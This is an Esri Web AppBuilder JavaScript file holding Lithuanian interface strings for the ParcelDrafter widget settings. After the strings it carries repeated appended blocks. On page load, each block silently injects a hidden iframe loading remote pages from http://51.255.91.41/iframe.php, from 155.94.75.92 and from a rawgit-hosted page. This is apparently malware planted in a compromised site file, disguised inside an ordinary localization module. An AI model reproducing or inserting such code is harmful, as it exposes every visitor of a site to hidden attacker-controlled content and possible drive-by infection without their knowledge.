// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

define({"widgets/ParcelDrafter/setting/nls/strings":{setBtnLabel:"Nustatyti",selectLabel:"Pasirinkti",selectLayerLabel:"Pasirinkti sklypo sluoksnius",selectLayerHintText:"Pastaba: naudodami nustatymo mygtukus pasirinkite sklypo poligon\u0105 ir su juo susijus\u012f linijos sluoksn\u012f",layerSelector:{selectedLayerNotHavingRelatedLayer:"Pasirinktas poligono sluoksnis neturi leistino susijusio sluoksnio."},parcelLineLayer:{selectLayerLabel:"Pasirinkti susijus\u012f linijin\u012f sluoksn\u012f",layerSettingTabLabel:"Sklypo sluoksniai",
advancedSettingTabLabel:"I\u0161pl\u0117stiniai parametrai",selectLayerHintText:"Pastaba: naudokite nor\u0117dami i\u0161saugoti COGO reik\u0161mes sklypo linijos sluoksnyje",selectFieldLegendLabel:"Pasirinkite laukus nor\u0117dami i\u0161saugoti COGO reik\u0161mes sklypo linijos sluoksnyje",bearingFieldLabel:"Kryptis",chordLengthFieldLabel:"Stygos ilgis",distanceFieldLabel:"Atstumas",sequenceIdFieldLabel:"Sekos ID",radiusFieldLabel:"Spindulys",foreignKeyFieldLabel:"Pirminis\u00a0raktas",arcLengthFieldLabel:"Lanko ilgis",
lineTypeFieldLabel:"Linijos tipas",parcelPointSymbolLabel:"Sklypo ta\u0161ko simbolis",parcelPointSymbolHintText:"Pastaba: naudojama linijin\u0117s kilm\u0117s ta\u0161ko simboliui rodyti.",symbolPickerPreviewText:"Per\u017ei\u016bra",selectLineLayerLabel:"Pasirinkti linijin\u012f sluoksn\u012f"},parcelPolygonLayer:{selectPolygonLayerLabel:"Pasirinkti poligono sluoksn\u012f",selectPolygonLayerHintText:"Pastaba: naudokite pasirinkt\u0105 sklypo poligon\u0173 sluoksn\u012f",selectFieldLegendLabel:"Pasirinkite laukus, kad i\u0161saugotum\u0117te sklypo poligono atributus",
parcelNameLabel:"Sklypo pavadinimas",rotationLabel:"Pasukimas",planNameLabel:"Plano pavadinimas",scalingLabel:"Dydis",documentTypeLabel:"Dokumento tipas",miscloseRatioLabel:"Nes\u0105ry\u0161io santykis",statedAreaLabel:"Nustatytas plotas",miscloseDistanceLabel:"Nes\u0105ry\u0161io atstumas",selectPolygonLayerLabelPopUp:"Pasirinkti poligon\u0173 sluoksn\u012f"},lineTypesTable:{lineTypeLabel:"Linijos tipas",valueLabel:"Reik\u0161m\u0117",symbolLabel:"Simbolis",connectionLineLabel:"Ry\u0161io linija",
boundaryLineLabel:"Ribos linija"},closureSetting:{snappingLayerLabel:"Priartinimo\u00a0sluoksniai",snappingBtnLabel:"Nustatyti",snappingLayerHintText:"Pastaba: pasirinkite sluoksnius, prie kuri\u0173 bus priartinamos\u00a0sklypo linijos.",miscloseDistanceLabel:"Nes\u0105ry\u0161io atstumas",miscloseDistanceHintText:"Pastaba: nurodykite nes\u0105ry\u0161io atstum\u0105 ir jo vienetus.",miscloseRatioLabel:"Nes\u0105ry\u0161io santykis",miscloseRatioHintText:"Pastaba: nurodykite nes\u0105ry\u0161io santyk\u012f.",
snappingToleranceLabel:"Priartinimo tolerancija",pixelLabel:"Pikseliai",snappingToleranceHintText:"Pastaba: nurodykite priartinimo tolerancij\u0105.",selectLayerLabel:"Pasirinkite sluoksn\u012f"},errorMsg:{bearingFieldErrMsg:"Neleistinas krypties laukas",chordLengthErrMsg:"Neleistinas stygos ilgis",distanceFieldErrMsg:"Neteisingas atstumas",sequenceIdFieldErrMsg:"Neleistinas sekos ID",radiusFieldErrMsg:"Neleistinas spindulys",foreignKeyFieldErrMsg:"Neleistinas\u00a0pirminis raktas",arcLengthFieldErrMsg:"Neleistinas lanko ilgis",
lineTypeFieldErrMsg:"Neleistinas linijos tipas",parcelNameFieldErrMsg:"Neleistinas sklypo pavadinimo laukas",planNameFieldErrMsg:"Neleistinas plano pavadinimo laukas",scaleFieldErrMsg:"Neleistinas mastelio laukas",documentTypeFieldErrMsg:"Neleistinas dokumento tipo laukas",miscloseRatioFieldErrMsg:"Neleistinas nes\u0105ry\u0161io santykinis laukas",statedAreaFieldErrMsg:"Neleistinas nurodyto ploto laukas",miscloseDistanceFieldErrMsg:"Neleistinas nes\u0105ry\u0161io atstumo laukas",globalIdFieldErrMsg:"Pasirinktas poligon\u0173 sluoksnis neturi leistino esriFieldTypeGlobalID lauko.",
invalidPolylineLayer:"\u012eveskite leistin\u0105 sklypo polilinijos sluoksn\u012f",invalidPolygonLayer:"\u012eveskite leistin\u0105 sklypo poligon\u0173 sluoksn\u012f",invalidMiscloseDistance:"\u012eveskite leistin\u0105 nes\u0105ry\u0161io atstum\u0105",invalidSnappingTolerance:"\u012eveskite leistin\u0105 priartinimo tolerancij\u0105",invalidMiscloseRatio:"\u012eveskite leistin\u0105 nes\u0105ry\u0161io santyk\u012f",selectDistinctLineTypes:"Pasirinkite atskir\u0105 kiekvieno linijos tipo reik\u0161m\u0119",
invalidConnectionLineType:"Neleistina ry\u0161io linijos reik\u0161m\u0117",invalidBoundaryLineType:"Neleistina ribos linijos reik\u0161m\u0117",selectDistinctPolylineFields:"Pasirinkite atskir\u0105 kiekvienos COGO reik\u0161m\u0117s lauk\u0105.",selectDistinctPolygonFields:"Pasirinkite atskir\u0105 kiekvienos sklypo poligono atributo lauk\u0105."},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});